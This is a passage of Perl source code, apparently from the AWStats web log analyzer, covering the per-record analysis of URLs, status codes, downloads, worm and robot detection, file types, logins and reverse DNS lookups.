{\n\t\t\t\t\t\t\t\tif ( $p =~ /^$_=/i ) { $found = 1; last; }\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif ( $p =~ /^$_=/ ) { $found = 1; last; }\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif ( !$found ) { $newstandalonequery .= \"$p&\"; }\n\t\t\t\t\t}\n\t\t\t\t\tchop $newstandalonequery;\n\t\t\t\t}\n\t\t\t\telse { $newstandalonequery = $standalonequery; }\n\n\t\t\t\t# Define query\n\t\t\t\t$field[$pos_url] = $urlwithnoquery;\n\t\t\t\tif ($newstandalonequery) {\n\t\t\t\t\t$field[$pos_url] .= \"$tokenquery$newstandalonequery\";\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse {\n\n\t\t\t# Trunc parameters of URL\n\t\t\t$field[$pos_url] =~ s/$regtruncurl//o;\n\t\t\t$urlwithnoquery  = $field[$pos_url];\n\t\t\t$tokenquery      = $1 || '';\n\t\t\t$standalonequery = $2 || '';\n\n\t# For IIS setup, if pos_query is enabled we need to use it for query strings\n\t\t\tif (   $pos_query >= 0\n\t\t\t\t&& $field[$pos_query]\n\t\t\t\t&& $field[$pos_query] ne '-' )\n\t\t\t{\n\t\t\t\t$tokenquery      = '?';\n\t\t\t\t$standalonequery = $field[$pos_query];\n\t\t\t}\n\t\t}\n\t\tif ( $URLWithAnchor && $anchor ) {\n\t\t\t$field[$pos_url] .= \"#$anchor\";\n\t\t}   # Restore anchor\n\t\t    # Here now urlwithnoquery is /mydir/mypage.ext, /mydir, /, /page#XXX\n\t\t    # Here now tokenquery is '' or '?' or ';'\n\t\t    # Here now standalonequery is '' or 'param1=x'\n\n\t\t# Define page and extension\n\t\t#--------------------------\n\t\tmy $PageBool = 1;\n\n\t\t# Extension\n\t\tmy $extension = Get_Extension($regext, $urlwithnoquery);\n\t\tif ( $NotPageList{$extension} || \n\t\t($MimeHashLib{$extension}[1]) && $MimeHashLib{$extension}[1] ne 'p') { $PageBool = 0;}\n\t\tif ( @NotPageFiles && &NotPageFile( $field[$pos_url] ) ) { $PageBool = 0; }\n\n\t\t# Analyze: misc tracker (must be before return code)\n\t\t#---------------------------------------------------\n\t\tif ( $urlwithnoquery =~ /$regmisc/o ) {\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\"  Found an URL that is a MiscTracker record with standalonequery=$standalonequery\",\n\t\t\t\t\t2\n\t\t\t\t);\n\t\t\t}\n\t\t\tmy $foundparam = 0;\n\t\t\tforeach ( split( /&/, $standalonequery ) ) {\n\t\t\t\tif ( $_ =~ /^screen=(\\d+)x(\\d+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\t$_screensize_h{\"$1x$2\"}++;\n\t\t\t\t\tnext;\n\t\t\t\t}\n\n   #if ($_ =~ /cdi=(\\d+)/i) \t\t\t{ $foundparam++; $_screendepth_h{\"$1\"}++; next; }\n\t\t\t\tif ( $_ =~ /^nojs=(\\w+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\tif ( $1 eq 'y' ) { $_misc_h{\"JavascriptDisabled\"}++; }\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $_ =~ /^java=(\\w+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\tif ( $1 eq 'true' ) { $_misc_h{\"JavaEnabled\"}++; }\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $_ =~ /^shk=(\\w+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\tif ( $1 eq 'y' ) { $_misc_h{\"DirectorSupport\"}++; }\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $_ =~ /^fla=(\\w+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\tif ( $1 eq 'y' ) { $_misc_h{\"FlashSupport\"}++; }\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $_ =~ /^rp=(\\w+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\tif ( $1 eq 'y' ) { $_misc_h{\"RealPlayerSupport\"}++; }\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $_ =~ /^mov=(\\w+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\tif ( $1 eq 'y' ) { $_misc_h{\"QuickTimeSupport\"}++; }\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $_ =~ /^wma=(\\w+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\tif ( $1 eq 'y' ) {\n\t\t\t\t\t\t$_misc_h{\"WindowsMediaPlayerSupport\"}++;\n\t\t\t\t\t}\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $_ =~ /^pdf=(\\w+)/i ) {\n\t\t\t\t\t$foundparam++;\n\t\t\t\t\tif ( $1 eq 'y' ) { $_misc_h{\"PDFSupport\"}++; }\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif ($foundparam) { $_misc_h{\"TotalMisc\"}++; }\n\t\t}\n\n\t\t# Analyze: successful favicon (=> countedtraffic=1 if favicon)\n\t\t#--------------------------------------------------\n\t\tif ( $urlwithnoquery =~ /$regfavico/o ) {\n\t\t\tif ( $field[$pos_code] != 404 ) {\n\t\t\t\t$_misc_h{'AddToFavourites'}++;\n\t\t\t}\n\t\t\t$countedtraffic =\n\t\t\t  1;    # favicon is a case that must not be counted anywhere else\n\t\t\t$_time_nv_h[$hourrecord]++;\n\t\t\tif ( $field[$pos_code] != 404 && $pos_size>0) {\n\t\t\t\t$_time_nv_k[$hourrecord] += int( $field[$pos_size] );\n\t\t\t}\n\t\t}\n\n\t\t# Analyze: Worms (=> countedtraffic=2 if worm)\n\t\t#---------------------------------------------\n\t\tif ( !$countedtraffic ) {\n\t\t\tif ($LevelForWormsDetection) {\n\t\t\t\tforeach (@WormsSearchIDOrder) {\n\t\t\t\t\tif ( $field[$pos_url] =~ /$_/ ) {\n\n\t\t\t\t\t\t# It's a worm\n\t\t\t\t\t\tmy $worm = &UnCompileRegex($_);\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\" Record is a hit from a worm identified by '$worm'\",\n\t\t\t\t\t\t\t\t2\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$worm = $WormsHashID{$worm} || 'unknown';\n\t\t\t\t\t\t$_worm_h{$worm}++;\n\t\t\t\t\t\tif ($pos_size>0){$_worm_k{$worm} += int( $field[$pos_size] );}\n\t\t\t\t\t\t$_worm_l{$worm} = $timerecord;\n\t\t\t\t\t\t$countedtraffic = 2;\n\t\t\t\t\t\tif ($PageBool) { $_time_nv_p[$hourrecord]++; }\n\t\t\t\t\t\t$_time_nv_h[$hourrecord]++;\n\t\t\t\t\t\tif ($pos_size>0){$_time_nv_k[$hourrecord] += int( $field[$pos_size] );}\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t# Analyze: Status code (=> countedtraffic=3 if error)\n\t\t#----------------------------------------------------\n\t\tif ( !$countedtraffic ) {\n\t\t\tif ( $LogType eq 'W' || $LogType eq 'S' )\n\t\t\t{    # HTTP record or Stream record\n\t\t\t\tif ( $ValidHTTPCodes{ $field[$pos_code] } ) {    # Code is valid\n\t\t\t\t\tif ( int($field[$pos_code]) == 304 && $pos_size>0) { $field[$pos_size] = 0; }\n\t\t\t\t\t# track downloads\n\t\t\t\t\tif (int($field[$pos_code]) == 200 && $MimeHashLib{$extension}[1] eq 'd' && $urlwithnoquery !~ /robots.txt$/ )  # We track download if $MimeHashLib{$extension}[1] = 'd'\n\t\t\t\t\t{\n\t\t\t\t\t\t$_downloads{$urlwithnoquery}->{'AWSTATS_HITS'}++;\n\t\t\t\t\t\t$_downloads{$urlwithnoquery}->{'AWSTATS_SIZE'} += ($pos_size>0 ? int($field[$pos_size]) : 0);\n\t\t\t\t\t\tif ($Debug) { debug( \" New download detected: '$urlwithnoquery'\", 2 ); }\n\t\t\t\t\t}\n\t\t\t\t# handle 206 download continuation message IF we had a successful 200 before, otherwise it goes in errors\n\t\t\t\t}elsif(int($field[$pos_code]) == 206 \n\t\t\t\t\t#&& $_downloads{$urlwithnoquery}->{$field[$pos_host]}[0] > 0 \n\t\t\t\t\t&& ($MimeHashLib{$extension}[1] eq 'd')){\n\t\t\t\t\t$_downloads{$urlwithnoquery}->{'AWSTATS_SIZE'} += ($pos_size>0 ? int($field[$pos_size]) : 0);\n\t\t\t\t\t$_downloads{$urlwithnoquery}->{'AWSTATS_206'}++;\n\t\t\t\t\t#$_downloads{$urlwithnoquery}->{$field[$pos_host]}[1] = $timerecord;\n\t\t\t\t\tif ($pos_size>0){\n\t\t\t\t\t\t#$_downloads{$urlwithnoquery}->{$field[$pos_host]}[2] = int($field[$pos_size]);\n\t\t\t\t\t\t$DayBytes{$yearmonthdayrecord} += int($field[$pos_size]);\n\t\t\t\t\t\t$_time_k[$hourrecord] += int($field[$pos_size]);\n\t\t\t\t\t}\n\t\t\t\t\t$countedtraffic = 6; # 206 continued download, so we track bandwidth but not pages or hits\n\t\t\t\t\tif ($Debug) { debug( \" Download continuation detected: '$urlwithnoquery'\", 2 ); }\n  \t\t\t\t}else {    # Code is not valid\n\t\t\t\t\tif ( $field[$pos_code] !~ /^\\d\\d\\d$/ ) {\n\t\t\t\t\t\t$field[$pos_code] = 999;\n\t\t\t\t\t}\n\t\t\t\t\t$_errors_h{ $field[$pos_code] }++;\n\t\t\t\t\tif ($pos_size>0){$_errors_k{ $field[$pos_code] } += int( $field[$pos_size] );}\n\t\t\t\t\tforeach my $code ( keys %TrapInfosForHTTPErrorCodes ) {\n\t\t\t\t\t\tif ( $field[$pos_code] == $code ) {\n\n\t\t\t\t\t\t\t# This is an error code which referrer need to be tracked\n\t\t\t\t\t\t\tmy $newurl =\n\t\t\t\t\t\t\t  substr( $field[$pos_url], 0,\n\t\t\t\t\t\t\t\t$MaxLengthOfStoredURL );\n\t\t\t\t\t\t\t$newurl =~ s/[$URLQuerySeparators].*$//;\n\t\t\t\t\t\t\t$_sider_h{$code}{$newurl}++;\n\t\t\t\t\t\t\tif ( $pos_referer >= 0 && $ShowHTTPErrorsPageDetail =~ /R/i  ) {\n\t\t\t\t\t\t\t\tmy $newreferer = $field[$pos_referer];\n\t\t\t\t\t\t\t\tif ( !$URLReferrerWithQuery ) {\n\t\t\t\t\t\t\t\t\t$newreferer =~ s/[$URLQuerySeparators].*$//;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$_referer_h{$code}{$newurl} = $newreferer;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $pos_host >= 0 && $ShowHTTPErrorsPageDetail =~ /H/i ) {\n\t\t\t\t\t\t\t\tmy $newhost = $field[$pos_host];\n\t\t\t\t\t\t\t\tif ( !$URLReferrerWithQuery ) {\n\t\t\t\t\t\t\t\t\t$newhost =~ s/[$URLQuerySeparators].*$//;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$_err_host_h{$code}{$newurl} = $newhost;\n\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\" Record stored in the status code chart (status code=$field[$pos_code])\",\n\t\t\t\t\t\t\t3\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\t$countedtraffic = 3;\n\t\t\t\t\tif ($PageBool) { $_time_nv_p[$hourrecord]++; }\n\t\t\t\t\t$_time_nv_h[$hourrecord]++;\n\t\t\t\t\tif ($pos_size>0){$_time_nv_k[$hourrecord] += int( $field[$pos_size] );}\n\t\t\t\t}\n\t\t\t}\n\t\t\telsif ( $LogType eq 'M' ) {    # Mail record\n\t\t\t\tif ( !$ValidSMTPCodes{ $field[$pos_code] } )\n\t\t\t\t{                          # Code is not valid\n\t\t\t\t\t$_errors_h{ $field[$pos_code] }++;\n\t\t\t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n\t\t\t\t\t\t$_errors_k{ $field[$pos_code] } +=\n\t\t\t\t\t\t  int( $field[$pos_size] );\n\t\t\t\t\t}\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\" Record stored in the status code chart (status code=$field[$pos_code])\",\n\t\t\t\t\t\t\t3\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\t$countedtraffic = 3;\n\t\t\t\t\tif ($PageBool) { $_time_nv_p[$hourrecord]++; }\n\t\t\t\t\t$_time_nv_h[$hourrecord]++;\n\t\t\t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n\t\t\t\t\t\t$_time_nv_k[$hourrecord] += int( $field[$pos_size] );\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telsif ( $LogType eq 'F' ) {    # FTP record\n\t\t\t}\n\t\t}\n\n\t\t# Analyze: Robot from robot database (=> countedtraffic=4 if robot)\n\t\t#------------------------------------------------------------------\n\t\tif ( !$countedtraffic ) {\n\t\t\tif ( $pos_agent >= 0 ) {\n\t\t\t\tif ($DecodeUA) {\n\t\t\t\t\t$field[$pos_agent] =~ s/%20/_/g;\n\t\t\t\t} # This is to support servers (like Roxen) that writes user agent with %20 in it\n\t\t\t\t$UserAgent = $field[$pos_agent];\n\t\t\t\tif ( $UserAgent && $UserAgent eq '-' ) { $UserAgent = ''; }\n\n\t\t\t\tif ($LevelForRobotsDetection) {\n\n\t\t\t\t\tif ($UserAgent) {\n\t\t\t\t\t\tmy $uarobot = $TmpRobot{$UserAgent};\n\t\t\t\t\t\tif ( !$uarobot ) {\n\n\t\t\t\t\t\t\t#study $UserAgent;\t\tDoes not increase speed\n\t\t\t\t\t\t\tforeach (@RobotsSearchIDOrder) {\n\t\t\t\t\t\t\t\tif ( $UserAgent =~ /$_/ ) {\n\t\t\t\t\t\t\t\t\tmy $bot = &UnCompileRegex($_);\n\t\t\t\t\t\t\t\t\t$TmpRobot{$UserAgent} = $uarobot = \"$bot\"\n\t\t\t\t\t\t\t\t\t  ; # Last time, we won't search if robot or not. We know it is.\n\t\t\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\t\t\tdebug(\n\"  UserAgent '$UserAgent' is added to TmpRobot with value '$bot'\",\n\t\t\t\t\t\t\t\t\t\t\t2\n\t\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( !$uarobot )\n\t\t\t\t\t\t\t{ # Last time, we won't search if robot or not. We know it's not.\n\t\t\t\t\t\t\t\t$TmpRobot{$UserAgent} = $uarobot = '-';\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif ( $uarobot ne '-' ) {\n\n\t\t\t\t\t\t\t# If robot, we stop here\n\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\tdebug(\n\"  UserAgent '$UserAgent' contains robot ID '$uarobot'\",\n\t\t\t\t\t\t\t\t\t2\n\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$_robot_h{$uarobot}++;\n\t\t\t\t\t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n\t\t\t\t\t\t\t\t$_robot_k{$uarobot} += int( $field[$pos_size] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$_robot_l{$uarobot} = $timerecord;\n\t\t\t\t\t\t\tif ( $urlwithnoquery =~ /$regrobot/o ) {\n\t\t\t\t\t\t\t\t$_robot_r{$uarobot}++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$countedtraffic = 4;\n\t\t\t\t\t\t\tif ($PageBool) { $_time_nv_p[$hourrecord]++; }\n\t\t\t\t\t\t\t$_time_nv_h[$hourrecord]++;\n\t\t\t\t\t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n\t\t\t\t\t\t\t\t$_time_nv_k[$hourrecord] +=\n\t\t\t\t\t\t\t\t  int( $field[$pos_size] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tmy $uarobot = 'no_user_agent';\n\n\t\t\t\t\t\t# It's a robot or at least a bad browser, we stop here\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\"  UserAgent not defined so it should be a robot, saved as robot 'no_user_agent'\",\n\t\t\t\t\t\t\t\t2\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$_robot_h{$uarobot}++;\n\t\t\t\t\t\tif ($pos_size>0){$_robot_k{$uarobot} += int( $field[$pos_size] );}\n\t\t\t\t\t\t$_robot_l{$uarobot} = $timerecord;\n\t\t\t\t\t\tif ( $urlwithnoquery =~ /$regrobot/o ) {\n\t\t\t\t\t\t\t$_robot_r{$uarobot}++;\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$countedtraffic = 4;\n\t\t\t\t\t\tif ($PageBool) { $_time_nv_p[$hourrecord]++; }\n\t\t\t\t\t\t$_time_nv_h[$hourrecord]++;\n\t\t\t\t\t\tif ($pos_size>0){$_time_nv_k[$hourrecord] += int( $field[$pos_size] );}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n   # Analyze: Robot from \"hit on robots.txt\" file (=> countedtraffic=5 if robot)\n   # -------------------------------------------------------------------------\n\t\tif ( !$countedtraffic ) {\n\t\t\tif ( $urlwithnoquery =~ /$regrobot/o ) {\n\t\t\t\tif ($Debug) { debug( \"  It's an unknown robot\", 2 ); }\n\t\t\t\t$_robot_h{'unknown'}++;\n\t\t\t\tif ($pos_size>0){$_robot_k{'unknown'} += int( $field[$pos_size] );}\n\t\t\t\t$_robot_l{'unknown'} = $timerecord;\n\t\t\t\t$_robot_r{'unknown'}++;\n\t\t\t\t$countedtraffic = 5;    # Must not be counted somewhere else\n\t\t\t\tif ($PageBool) { $_time_nv_p[$hourrecord]++; }\n\t\t\t\t$_time_nv_h[$hourrecord]++;\n\t\t\t\tif ($pos_size>0){$_time_nv_k[$hourrecord] += int( $field[$pos_size] );}\n\t\t\t}\n\t\t}\n\n\t\t# Analyze: File type - Compression\n\t\t#---------------------------------\n\t\tif ( !$countedtraffic || $countedtraffic == 6) {\n\t\t\tif ($LevelForFileTypesDetection) {\n\t\t\t\tif ($countedtraffic != 6){$_filetypes_h{$extension}++;}\n\t\t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n\t\t\t\t\t$_filetypes_k{$extension} += int( $field[$pos_size] );\n\t\t\t\t}\n\n\t\t\t\t# Compression\n\t\t\t\tif ( $pos_gzipin >= 0 && $field[$pos_gzipin] )\n\t\t\t\t{    # If in and out in log\n\t\t\t\t\tmy ( $notused, $in ) = split( /:/, $field[$pos_gzipin] );\n\t\t\t\t\tmy ( $notused1, $out, $notused2 ) =\n\t\t\t\t\t  split( /:/, $field[$pos_gzipout] );\n\t\t\t\t\tif ($out) {\n\t\t\t\t\t\t$_filetypes_gz_in{$extension}  += $in;\n\t\t\t\t\t\t$_filetypes_gz_out{$extension} += $out;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $pos_compratio >= 0\n\t\t\t\t\t&& ( $field[$pos_compratio] =~ /(\\d+)/ ) )\n\t\t\t\t{    # Calculate in/out size from percentage\n\t\t\t\t\tif ( $fieldlib[$pos_compratio] eq 'gzipratio' ) {\n\n\t# with mod_gzip:    % is size (before-after)/before (low for jpg) ??????????\n\t\t\t\t\t\t$_filetypes_gz_in{$extension} +=\n\t\t\t\t\t\t  int(\n\t\t\t\t\t\t\t$field[$pos_size] * 100 / ( ( 100 - $1 ) || 1 ) );\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\n\t\t\t\t\t   # with mod_deflate: % is size after/before (high for jpg)\n\t\t\t\t\t\t$_filetypes_gz_in{$extension} +=\n\t\t\t\t\t\t  int( $field[$pos_size] * 100 / ( $1 || 1 ) );\n\t\t\t\t\t}\n\t\t\t\t\tif ($pos_size>0){$_filetypes_gz_out{$extension} += int( $field[$pos_size] );}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Analyze: Date - Hour - Pages - Hits - Kilo\n\t\t\t#-------------------------------------------\n\t\t\tif ($PageBool) {\n\n# Replace default page name with / only ('if' is to increase speed when only 1 value in @DefaultFile)\n\t\t\t\tif ( @DefaultFile > 1 ) {\n\t\t\t\t\tforeach my $elem (@DefaultFile) {\n\t\t\t\t\t\tif ( $field[$pos_url] =~ s/\\/$elem$/\\// ) { last; }\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse { $field[$pos_url] =~ s/$regdefault/\\//o; }\n\n# FirstTime and LastTime are First and Last human visits (so changed if access to a page)\n\t\t\t\t$FirstTime{$lastprocesseddate} ||= $timerecord;\n\t\t\t\t$LastTime{$lastprocesseddate} = $timerecord;\n\t\t\t\t$DayPages{$yearmonthdayrecord}++;\n\t\t\t\t$_url_p{ $field[$pos_url] }++;   #Count accesses for page (page)\n\t\t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n\t\t\t\t\t$_url_k{ $field[$pos_url] } += int( $field[$pos_size] );\n\t\t\t\t}\n\t\t\t\t$_time_p[$hourrecord]++;    #Count accesses for hour (page)\n\t\t\t\t                            # TODO Use an id for hash key of url\n\t\t\t\t                            # $_url_t{$_url_id}\n\t\t\t}\n\t\t\tif ($countedtraffic != 6){$_time_h[$hourrecord]++;}\n \t\t\tif ($countedtraffic != 6){$DayHits{$yearmonthdayrecord}++;}    #Count accesses for hour (hit)\n  \t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n  \t\t\t\t$_time_k[$hourrecord]          += int( $field[$pos_size] );\n \t\t\t\t$DayBytes{$yearmonthdayrecord} += int( $field[$pos_size] );     #Count accesses for hour (kb)\n  \t\t\t}\n\n\t\t\t# Analyze: Login\n\t\t\t#---------------\n\t\t\tif (   $pos_logname >= 0\n\t\t\t\t&& $field[$pos_logname]\n\t\t\t\t&& $field[$pos_logname] ne '-' )\n\t\t\t{\n\t\t\t\t$field[$pos_logname] =~\n\t\t\t\t  s/ /_/g;    # This is to allow space in logname\n\t\t\t\tif ( $LogFormat eq '6' ) {\n\t\t\t\t\t$field[$pos_logname] =~ s/^\\\"//;\n\t\t\t\t\t$field[$pos_logname] =~ s/\\\"$//;\n\t\t\t\t}             # logname field has \" with Domino 6+\n\t\t\t\tif ($AuthenticatedUsersNotCaseSensitive) {\n\t\t\t\t\t$field[$pos_logname] = lc( $field[$pos_logname] );\n\t\t\t\t}\n\n\t\t\t\t# We found an authenticated user\n\t\t\t\tif ($PageBool) {\n\t\t\t\t\t$_login_p{ $field[$pos_logname] }++;\n\t\t\t\t}             #Count accesses for page (page)\n\t\t\t\tif ($countedtraffic != 6){$_login_h{$field[$pos_logname]}++;}         #Count accesses for page (hit)\n\t\t\t\tif ($pos_size>0){$_login_k{ $field[$pos_logname] } +=\n\t\t\t\t  int( $field[$pos_size] );}    #Count accesses for page (kb)\n\t\t\t\t$_login_l{ $field[$pos_logname] } = $timerecord;\n\t\t\t}\n\t\t}\n\n\t\t# Do DNS lookup\n\t\t#--------------\n\t\tmy $Host         = $field[$pos_host];\n\t\tmy $HostResolved = ''\n\t\t  ; # HostResolved will be defined in next paragraf if countedtraffic is true\n\n\t\tif( $Host =~ /^([^:]+):[0-9]+$/ ){ # Host may sometimes have an ip:port syntax (ex: 54.32.12.12:60321)\n\t\t    $Host = $1;\n\t\t}\n\n\n\t\tif ( !$countedtraffic || $countedtraffic == 6) {\n\t\t\tmy $ip = 0;\n\t\t\tif ($DNSLookup) {    # DNS lookup is 1 or 2\n\t\t\t\tif ( $Host =~ /$regipv4l/o ) {    # IPv4 lighttpd\n\t\t\t\t\t$Host =~ s/^::ffff://;\n\t\t\t\t\t$ip = 4;\n\t\t\t\t}\n\t\t\t\telsif ( $Host =~ /$regipv4/o ) { $ip = 4; }    # IPv4\n\t\t\t\telsif ( $Host =~ /$regipv6/o ) { $ip = 6; }    # IPv6\n\t\t\t\tif ($ip) {\n\n\t\t\t\t\t# Check in static DNS cache file\n\t\t\t\t\t$HostResolved = $MyDNSTable{$Host};\n\t\t\t\t\tif ($HostResolved) {\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\"  DNS lookup asked for $Host and found in static DNS cache file: $HostResolved\",\n\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telsif ( $DNSLookup == 1 ) {\n\n\t\t   # Check in session cache (dynamic DNS cache file + session DNS cache)\n\t\t\t\t\t\t$HostResolved = $TmpDNSLookup{$Host};\n\t\t\t\t\t\tif ( !$HostResolved ) {\n\t\t\t\t\t\t\tif ( @SkipDNSLookupFor && &SkipDNSLookup($Host) ) {\n\t\t\t\t\t\t\t\t$HostResolved = $TmpDNSLookup{$Host} = '*';\n\t\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\t\tdebug(\n\"  No need of reverse DNS lookup for $Host, skipped at user request.\",\n\t\t\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif ( $ip == 4 ) {\n\t\t\t\t\t\t\t\t\tmy $lookupresult =\n\t\t\t\t\t\t\t\t\t  gethostbyaddr(\n\t\t\t\t\t\t\t\t\t\tpack( \"C4\", split( /\\./, $Host ) ),\n\t\t\t\t\t\t\t\t\t\tAF_INET )\n\t\t\t\t\t\t\t\t\t  ; # This is very slow, may spend 20 seconds\n\t\t\t\t\t\t\t\t\tif (   !$lookupresult\n\t\t\t\t\t\t\t\t\t\t|| $lookupresult =~ /$regipv4/o\n\t\t\t\t\t\t\t\t\t\t|| !IsAscii($lookupresult) )\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t$TmpDNSLookup{$Host} = $HostResolved =\n\t\t\t\t\t\t\t\t\t\t  '*';\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\t$TmpDNSLookup{$Host} = $HostResolved =\n\t\t\t\t\t\t\t\t\t\t  $lookupresult;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\t\t\tdebug(\n\"  Reverse DNS lookup for $Host done: $HostResolved\",\n\t\t\t\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telsif ( $ip == 6 ) {\n\t\t\t\t\t\t\t\t\tif ( $PluginsLoaded{'GetResolvedIP'}\n\t\t\t\t\t\t\t\t\t\t{'ipv6'} )\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\tmy $lookupresult =\n\t\t\t\t\t\t\t\t\t\t  GetResolvedIP_ipv6($Host);\n\t\t\t\t\t\t\t\t\t\tif (   !$lookupresult\n\t\t\t\t\t\t\t\t\t\t\t|| !IsAscii($lookupresult) )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t$TmpDNSLookup{$Host} =\n\t\t\t\t\t\t\t\t\t\t\t  $HostResolved = '*';\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\t\t$TmpDNSLookup{$Host} =\n\t\t\t\t\t\t\t\t\t\t\t  $HostResolved = $lookupresult;\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\t$TmpDNSLookup{$Host} = $HostResolved =\n\t\t\t\t\t\t\t\t\t\t  '*';\n\t\t\t\t\t\t\t\t\t\twarning(\n\"Reverse DNS lookup for $Host not available without ipv6 plugin enabled.\"\n\t\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse { error(\"Bad value vor ip\"); }\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\t$HostResolved = '*';\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\"  DNS lookup by static DNS cache file asked for $Host but not found.\",\n\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  DNS lookup asked for $Host but this is not an IP address.\",\n\t\t\t\t\t\t\t4\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\t$DNSLookupAlreadyDone = $LogFile;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\tif ( $Host =~ /$regipv4l/o ) {\n\t\t\t\t\t$Host =~ 